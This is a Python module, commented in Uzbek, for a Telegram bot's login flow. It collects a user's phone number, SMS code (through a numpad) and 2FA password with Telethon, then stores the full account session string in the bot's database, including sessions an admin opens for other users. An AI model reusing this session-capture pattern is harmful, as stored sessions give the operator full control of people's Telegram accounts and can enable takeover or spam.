"""
Login va ro'yxatdan o'tish oqimi.

Ketma-ketlik:
1. Ism
2. Familiya
3. Telefon
4. SMS kod (numpad orqali)
5. 2FA (bo'lsa)
6. Sessiya yaratiladi -> adminga xabar
"""

from __future__ import annotations

import asyncio
import contextlib
import time
from dataclasses import dataclass

from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberBannedError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession
from telegram import Update
from telegram.ext import ContextTypes

from bot import keyboards as KB
from bot import texts as T
from config.config import (
    API_HASH,
    API_ID,
    CODE_LENGTH,
    LOGIN_TIMEOUT_S,
    MAX_CODE_LENGTH,
    MAX_WRONG_CODE,
    SMS_COOLDOWN_MIN,
    SMS_MAX_ATTEMPTS,
    SUPER_ADMIN,
)
from core import database as db
from core.logger import log
from core.utils import is_valid_name, is_valid_phone


# ─────────────────────────────────────────────────────────────────────────
# GLOBAL HOLAT
# ─────────────────────────────────────────────────────────────────────────
@dataclass
class LoginCtx:
    """Login jarayoni uchun ma'lumot."""
    client: TelegramClient
    phone: str
    phone_code_hash: str
    started_at: float
    wrong_count: int = 0
    resend_count: int = 0
    for_uid: int | None = None
    target_name: str = ""


user_states: dict[int, dict] = {}
login_ctx: dict[int, LoginCtx] = {}
sms_attempts: dict[int, list[float]] = {}

application = None


def set_application(app) -> None:
    """main.py dan chaqiriladi."""
    global application
    application = app


# ─────────────────────────────────────────────────────────────────────────
# TOZALASH
# ─────────────────────────────────────────────────────────────────────────
async def cleanup_login(uid: int) -> None:
    """Foydalanuvchi login holatini tozalash."""
    ctx = login_ctx.pop(uid, None)
    if ctx:
        with contextlib.suppress(Exception):
            await ctx.client.disconnect()
    user_states.pop(uid, None)
  

# ─────────────────────────────────────────────────────────────────────────
# SMS QAYTA SO'RASH LIMITI
# ─────────────────────────────────────────────────────────────────────────
def can_resend_sms(uid: int) -> tuple[bool, int]:
    """Foydalanuvchi yana SMS so'rashi mumkinmi?"""
    now = time.time()
    window = SMS_COOLDOWN_MIN * 60
    attempts = [t for t in sms_attempts.get(uid, []) if t >= now - window]

    if len(attempts) >= SMS_MAX_ATTEMPTS:
        oldest = min(attempts)
        wait_s = (oldest + window) - now
        wait_min = max(1, int(wait_s // 60) + (1 if wait_s % 60 else 0))
        return False, wait_min

    attempts.append(now)
    sms_attempts[uid] = attempts
    return True, 0


def reset_sms_attempts(uid: int) -> None:
    sms_attempts.pop(uid, None)


# ─────────────────────────────────────────────────────────────────────────
# NUMPAD YUBORISH / YANGILASH
# ─────────────────────────────────────────────────────────────────────────
async def send_numpad(uid: int, buffer: str = "", hint: str = "") -> None:
    """SMS kod oynasini yuboradi yoki yangilaydi."""
    text = T.numpad_text(buffer, hint)
    state = user_states.get(uid, {})
    msg_id = state.get("numpad_msg_id")

    if msg_id:
        try:
            await application.bot.edit_message_text(
                chat_id=uid,
                message_id=msg_id,
                text=text,
                reply_markup=KB.kb_numpad(),
            )
            state["ts"] = time.time()
            user_states[uid] = state
            return
        except Exception:
            pass

    msg = await application.bot.send_message(
        uid, text, reply_markup=KB.kb_numpad()
    )
    state["numpad_msg_id"] = msg.message_id
    state["ts"] = time.time()
    user_states[uid] = state


# ─────────────────────────────────────────────────────────────────────────
# KOD SO'RASH
# ─────────────────────────────────────────────────────────────────────────
async def request_code(
    uid: int,
    phone: str,
    for_uid: int | None = None,
    target_name: str = "",
) -> None:
    """Telegramga kod so'rovini yuboradi."""
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=20)
        result = await client.send_code_request(phone)

        login_ctx[uid] = LoginCtx(
            client=client,
            phone=phone,
            phone_code_hash=result.phone_code_hash,
            started_at=time.time(),
            for_uid=for_uid,
            target_name=target_name,
        )
        user_states[uid] = {
            "step": "code",
            "ts": time.time(),
            "code_buffer": "",
        }
        await send_numpad(uid, "", hint=T.CODE_HINT_SENT)
        log(f"📩 Kod so'raldi: {uid} ({phone})")

    except PhoneNumberInvalidError:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        await application.bot.send_message(uid, T.PHONE_INVALID)

    except PhoneNumberBannedError:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        await application.bot.send_message(uid, "🚫 Bu raqam bloklangan.")

    except FloodWaitError as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        wait_min = max(1, e.seconds // 60)
        await application.bot.send_message(
            uid, T.FLOOD_WAIT.format(minutes=wait_min)
        )

    except Exception as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"request_code xatolik {uid}: {type(e).__name__}: {e}", "error")
        await application.bot.send_message(uid, T.GENERIC_ERROR)
      

# ─────────────────────────────────────────────────────────────────────────
# LOGINNI BOSHLASH
# ─────────────────────────────────────────────────────────────────────────
async def begin_login(update: Update) -> None:
    """🔑 Login tugmasi bosilganda."""
    uid = update.effective_user.id
    await cleanup_login(uid)

    if await db.is_blocked(uid):
        await update.message.reply_text(T.BLOCKED, reply_markup=KB.kb_blocked())
        return

    user = await db.get_user(uid)

    if not user:
        user_states[uid] = {"step": "name", "ts": time.time()}
        await update.message.reply_text(T.ASK_NAME)
        return

    if user.get("awaiting_approval"):
        await update.message.reply_text(T.LOGIN_ALREADY_PENDING)
        return

    if not user.get("is_admin"):
        await update.message.reply_text(T.LOGIN_NOT_APPROVED)
        return

    phone = user.get("phone")
    if not phone:
        user_states[uid] = {"step": "phone", "ts": time.time()}
        await update.message.reply_text(
            "📱 Telefon raqamingizni yuboring:\n\nFormat: +998XXXXXXXXX"
        )
        return

    await update.message.reply_text(T.PHONE_ACCEPTED.format(phone=phone))
    await request_code(uid, phone)


# ─────────────────────────────────────────────────────────────────────────
# ISM
# ─────────────────────────────────────────────────────────────────────────
async def handle_name(update: Update, text: str) -> None:
    uid = update.effective_user.id
    name = text.strip()

    if not is_valid_name(name):
        await update.message.reply_text(T.NAME_TOO_SHORT)
        return

    name = name[:64]
    user_states[uid] = {
        "step": "surname",
        "ts": time.time(),
        "name": name,
    }
    await update.message.reply_text(T.NAME_ACCEPTED.format(name=name))


# ─────────────────────────────────────────────────────────────────────────
# FAMILIYA
# ─────────────────────────────────────────────────────────────────────────
async def handle_surname(update: Update, text: str) -> None:
    uid = update.effective_user.id
    surname = text.strip()

    if not is_valid_name(surname):
        await update.message.reply_text(T.SURNAME_TOO_SHORT)
        return

    state = user_states.get(uid, {})
    name = state.get("name", "")
    full_name = f"{name} {surname}"[:64]

    state["step"] = "phone"
    state["full_name"] = full_name
    state["ts"] = time.time()
    user_states[uid] = state

    await update.message.reply_text(
        T.SURNAME_ACCEPTED.format(full_name=full_name)
    )


# ─────────────────────────────────────────────────────────────────────────
# TELEFON
# ─────────────────────────────────────────────────────────────────────────
async def handle_phone(update: Update, text: str) -> None:
    """Foydalanuvchi telefon raqamni kiritadi."""
    uid = update.effective_user.id
    phone = text.strip().replace(" ", "").replace("-", "")

    if not is_valid_phone(phone):
        await update.message.reply_text(T.PHONE_INVALID)
        return

    await db.set_phone(uid, phone)

    state = user_states.get(uid, {})
    full_name = state.get("full_name", "")
    if full_name:
        await db.set_user_info(
            uid, full_name, update.effective_user.username or ""
        )

    user_states.pop(uid, None)
    await update.message.reply_text(T.PHONE_ACCEPTED.format(phone=phone))
    await request_code(uid, phone)
  

# ─────────────────────────────────────────────────────────────────────────
# SMS KODNI TEKSHIRISH
# ─────────────────────────────────────────────────────────────────────────
async def attempt_signin(uid: int, code: str) -> None:
    """SMS kodni Telegramga yuborib tekshiradi."""
    ctx = login_ctx.get(uid)
    if not ctx:
        await cleanup_login(uid)
        await application.bot.send_message(
            uid,
            "❌ Login jarayoni buzildi. Qaytadan 🔑 Login bosing.",
            reply_markup=KB.kb_login(),
        )
        return

    try:
        if not ctx.client.is_connected():
            await asyncio.wait_for(ctx.client.connect(), timeout=20)

        await ctx.client.sign_in(
            phone=ctx.phone,
            code=code,
            phone_code_hash=ctx.phone_code_hash,
        )
        await finalize_login(uid)

    except SessionPasswordNeededError:
        old_msg = user_states.get(uid, {}).get("numpad_msg_id")
        if old_msg:
            with contextlib.suppress(Exception):
                await application.bot.delete_message(
                    chat_id=uid, message_id=old_msg
                )

        user_states[uid] = {"step": "password", "ts": time.time()}
        await application.bot.send_message(uid, T.ASK_PASSWORD)

    except PhoneCodeInvalidError:
        ctx.wrong_count += 1

        if ctx.wrong_count >= MAX_WRONG_CODE:
            await cleanup_login(uid)
            await application.bot.send_message(
                uid,
                T.CODE_MAX_WRONG.format(count=ctx.wrong_count),
                reply_markup=KB.kb_login(),
            )
            return

        state = user_states.get(uid, {})
        state["code_buffer"] = ""
        state["ts"] = time.time()
        user_states[uid] = state

        await send_numpad(
            uid,
            "",
            hint=T.CODE_HINT_WRONG.format(
                count=ctx.wrong_count, max=MAX_WRONG_CODE
            ),
        )

    except PhoneCodeExpiredError:
        allowed, wait_min = can_resend_sms(uid)
        if not allowed:
            await cleanup_login(uid)
            await application.bot.send_message(
                uid,
                T.SMS_LIMIT_REACHED.format(
                    attempts=SMS_MAX_ATTEMPTS, minutes=wait_min
                ),
                reply_markup=KB.kb_login(),
            )
            return

        try:
            result = await asyncio.wait_for(
                ctx.client.send_code_request(ctx.phone), timeout=20
            )
            ctx.phone_code_hash = result.phone_code_hash
            ctx.wrong_count = 0

            state = user_states.get(uid, {})
            state["code_buffer"] = ""
            state["ts"] = time.time()
            user_states[uid] = state

            await send_numpad(uid, "", hint=T.CODE_HINT_RESENT)
            log(f"🔁 Kod qayta yuborildi: {uid}")

        except FloodWaitError as e:
            await cleanup_login(uid)
            wait_min = max(1, e.seconds // 60)
            await application.bot.send_message(
                uid,
                T.FLOOD_WAIT.format(minutes=wait_min),
                reply_markup=KB.kb_login(),
            )
        except Exception as e:
            await cleanup_login(uid)
            log(f"resend xatolik {uid}: {type(e).__name__}: {e}", "error")
            await application.bot.send_message(
                uid, T.GENERIC_ERROR, reply_markup=KB.kb_login()
            )

    except FloodWaitError as e:
        await cleanup_login(uid)
        wait_min = max(1, e.seconds // 60)
        await application.bot.send_message(
            uid,
            T.FLOOD_WAIT.format(minutes=wait_min),
            reply_markup=KB.kb_login(),
        )

    except Exception as e:
        await cleanup_login(uid)
        log(f"sign_in xatolik {uid}: {type(e).__name__}: {e}", "error")
        await application.bot.send_message(
            uid, T.GENERIC_ERROR, reply_markup=KB.kb_login()
        )


# ─────────────────────────────────────────────────────────────────────────
# 2FA PAROL
# ─────────────────────────────────────────────────────────────────────────
async def handle_password(update: Update, text: str) -> None:
    """2FA parolni qabul qilish."""
    uid = update.effective_user.id
    ctx = login_ctx.get(uid)

    if not ctx:
        await cleanup_login(uid)
        await update.message.reply_text(
            "❌ Jarayon buzildi. Qaytadan 🔑 Login bosing.",
            reply_markup=KB.kb_login(),
        )
        return

    try:
        if not ctx.client.is_connected():
            await asyncio.wait_for(ctx.client.connect(), timeout=20)

        await ctx.client.sign_in(password=text)
        await finalize_login(uid)

    except PasswordHashInvalidError:
        await update.message.reply_text(T.PASSWORD_WRONG)

    except FloodWaitError as e:
        await cleanup_login(uid)
        wait_min = max(1, e.seconds // 60)
        await update.message.reply_text(
            T.FLOOD_WAIT.format(minutes=wait_min),
            reply_markup=KB.kb_login(),
        )

    except Exception as e:
        await cleanup_login(uid)
        log(f"password xatolik {uid}: {type(e).__name__}: {e}", "error")
        await update.message.reply_text(
            T.GENERIC_ERROR, reply_markup=KB.kb_login()
        )
      

# ─────────────────────────────────────────────────────────────────────────
# LOGIN YAKUNI
# ─────────────────────────────────────────────────────────────────────────
async def finalize_login(uid: int) -> None:
    """
    Login tugaganda sessiyani saqlash.

    Muhim: admin boshqa user uchun sessiya ochsa — user ADMIN QILINMAYDI.
    """
    ctx = login_ctx.get(uid)
    if not ctx:
        return

    sess_str = ctx.client.session.save()
    with contextlib.suppress(Exception):
        await ctx.client.disconnect()

    for_uid = ctx.for_uid
    target_name = ctx.target_name
    phone = ctx.phone

    login_ctx.pop(uid, None)
    user_states.pop(uid, None)
    reset_sms_attempts(uid)

    # ── 1) ADMIN boshqa foydalanuvchi uchun sessiya ochgan ──
    if for_uid is not None:
        await db.set_session(for_uid, sess_str)
        await db.set_awaiting_approval(for_uid, False)
        # add_admin CHAQIRILMAYDI!

        log(f"✅ Admin {uid} → user {for_uid} sessiyasini ochdi")

        await application.bot.send_message(
            uid,
            f"✅ Foydalanuvchi sessiyasi ochildi.\n\n"
            f"👤 {target_name or 'Noma`lum'}\n"
            f"📱 {phone}\n"
            f"🆔 {for_uid}",
            reply_markup=KB.kb_main(super_admin=True),
        )

        with contextlib.suppress(Exception):
            await application.bot.send_message(
                for_uid,
                "✅ Admin sizning hisobingizni faollashtirdi!\n\n"
                "Endi botdan foydalanishingiz mumkin. 🔑 Login bosing.",
            )
        return

    # ── 2) SUPER ADMIN o'zi ──
    if uid == SUPER_ADMIN:
        await db.set_session(uid, sess_str)
        await db.set_awaiting_approval(uid, False)
        await db.add_admin(uid)
        log(f"✅ Super admin kirdi: {uid}")

        await application.bot.send_message(
            uid,
            "✅ Super admin sifatida kirdingiz!",
            reply_markup=KB.kb_main(super_admin=True),
        )
        return

    # ── 3) Tasdiqlangan oddiy foydalanuvchi ──
    if await db.is_admin(uid):
        await db.set_session(uid, sess_str)
        await db.set_awaiting_approval(uid, False)

        info = await db.get_user_info(uid)
        name = info.get("name") or "Foydalanuvchi"

        log(f"✅ Tasdiqlangan user kirdi: {uid}")
        await application.bot.send_message(
            uid,
            f"✅ {name}, tizimga muvaffaqiyatli kirdingiz!\n\n"
            "Endi guruh va post qo'shib, ▶️ Start bosishingiz mumkin.",
            reply_markup=KB.kb_main(),
        )
        return

    # ── 4) Yangi foydalanuvchi (tasdiqlanmagan) ──
    await db.set_pending(uid, sess_str)
    await db.set_awaiting_approval(uid, True)

    log(f"⏳ Tasdiq kutilmoqda: {uid}")
    await notify_super_for_approval(uid)

    await application.bot.send_message(
        uid,
        T.LOGIN_SUCCESS_PENDING,
        reply_markup=KB.kb_pending(),
    )


# ─────────────────────────────────────────────────────────────────────────
# ADMINGA XABAR
# ─────────────────────────────────────────────────────────────────────────
async def notify_super_for_approval(uid: int) -> None:
    """Super adminga yangi foydalanuvchi haqida xabar."""
    info = await db.get_user_info(uid)
    name = info.get("name") or "Noma`lum"
    username = info.get("username") or ""
    phone = await db.get_phone(uid) or "—"

    text = T.new_user_notification(name, phone, username, uid)
    kb = KB.kb_admin_approve(uid)

    with contextlib.suppress(Exception):
        await application.bot.send_message(SUPER_ADMIN, text, reply_markup=kb)


# ─────────────────────────────────────────────────────────────────────────
# KODNI MATN SIFATIDA YUBORSA
# ─────────────────────────────────────────────────────────────────────────
async def handle_code(update: Update, text: str) -> None:
    """Kodni matn sifatida yozsa — ogohlantiramiz."""
    uid = update.effective_user.id
    await update.message.reply_text(T.CODE_NOT_MATN)

    state = user_states.get(uid, {})
    state.setdefault("code_buffer", "")
    state["ts"] = time.time()
    user_states[uid] = state

    await send_numpad(uid, state["code_buffer"])


# ─────────────────────────────────────────────────────────────────────────
# YORDAMCHI
# ─────────────────────────────────────────────────────────────────────────
def is_in_login(uid: int) -> bool:
    """Foydalanuvchi login jarayonidami?"""
    state = user_states.get(uid)
    if not state:
        return False
    return state.get("step") in ("name", "surname", "phone", "code", "password")


def get_step(uid: int) -> str | None:
    """Hozirgi login qadamini qaytaradi."""
    state = user_states.get(uid, {})
    return state.get("step")
